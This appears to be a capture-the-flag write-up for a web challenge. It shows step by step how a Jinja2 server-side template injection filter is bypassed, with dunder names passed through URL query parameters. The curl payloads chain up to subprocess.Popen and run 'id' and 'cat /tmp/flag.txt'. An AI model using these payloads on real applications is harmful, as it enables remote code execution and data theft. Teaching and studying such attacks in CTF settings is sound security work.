---
layout: page
title: Renderer
category: Web
type: ctf_tcon82025
desc: Renderer
img-link: /writeups/ctf/tcon82025/img/renderer/1.png
---


# [Web] Renderer - 250

We are given with the link to to https://renderer.project-ag.org

![Renderer Home Page](img/renderer/1.png)

It asks for an input and prints your input back. Using the context of the challenge's title, we tried a simple SSTI payload `{{ 7 * 7 }}`. Screenshot below shows that it's actually vulnerable.

![Renderer Home Page](img/renderer/2.png)

We thought that using the [usual](https://github.com/payloadbox/ssti-payloads), we would be able to get code execution but there's some blacklisting happening on the backend and we're receiving the error if we try the keywords `class`, `config`, or even just `__` (double underscore).

![Dashboard HTML](img/renderer/3.png)

With this in mind, we thought that we have to bypass the blacklisting. We tried different keywords and writeups that bypasses SSTI and we found [this](https://ctftime.org/writeup/34179) writeup that has a bypass method. It uses the {% raw %}`{% print(request) %}`{% endraw %} as the starting point for the payload build up. We tried using that payload and it worked

![Dashboard flag](img/renderer/5.png)

We proceeded to send payload {% raw %}`{% print(request.args.test1) %}`{% endraw %} and then we set `test1=aaaaaa` in the URL. The payload will print `test1` content.

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=aaaaa' -X POST --data 'name={% print(request.args.test1) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/6.png)

And as can be seen from the screenshot above, it manages to print the `test1` content which is `aaaaa`. The next thing we have to do is to buildup `request.__class__.__mro__[3].__subclasses__()` and from there, access Popen to execute code. 

We first tried to build is `request.__class__`. We can do this by setting up payload:

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__' -X POST --data 'name={% print(request|attr(request.args.test1)) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/7.png)

Since it worked, turns out that the non-POST parameters are not being checked within the blacklisting. Next is accessing `request.__class__.__mro__`:

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__' -X POST --data 'name={% print(request|attr(request.args.test1)|attr(request.args.test2)) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/8.png)

Next is accessing `request.__class__.__mro__[3].__subclasses__`:

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__&test3=__subclasses__' -X POST --data 'name={% print(((request|attr(request.args.test1)|attr(request.args.test2))[3])|attr(request.args.test3)) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/9.1.png)

Next is accessing `request.__class__.mro__[3].__subclassess__()`;

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__&test3=__subclasses__' -X POST --data 'name={% print((((request|attr(request.args.test1)|attr(request.args.test2))[3])|attr(request.args.test3))()) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/10.1.png)

Then we have to find the index of `Popen` class. Turns out it's in 503:

![Dashboard flag](img/renderer/11.png)


Next is accessing `request.__class__.mro__[3].__subclassess__()[503]`;

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__&test3=__subclasses__' -X POST --data 'name={% print(((((request|attr(request.args.test1)|attr(request.args.test2))[3])|attr(request.args.test3))())[503]) %}&message=aaa
```
{% endraw %}

![Dashboard flag](img/renderer/12.png)

Now we just have to execute the `Popen`. 

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__&test3=__subclasses__' -X POST --data 'name={% print((((((request|attr(request.args.test1)|attr(request.args.test2))[3])|attr(request.args.test3))())[503])(["id"], stdout=-1).communicate()[0]) %}&message=aaa
```
{% endraw %}

And then we have managed to execute code:

![Dashboard flag](img/renderer/13.png)

Then we grabbed the flag by cat-ing `/tmp/flag.txt`

{% raw %}
```bash
curl 'https://renderer.project-ag.org/render?test1=__class__&test2=__mro__&test3=__subclasses__' -X POST --data 'name={% print((((((request|attr(request.args.test1)|attr(request.args.test2))[3])|attr(request.args.test3))())[503])(["cat","/tmp/flag.txt"], stdout=-1).communicate()[0]) %}&message=aaa
```
{% endraw %}


![Dashboard flag](img/renderer/14.png)
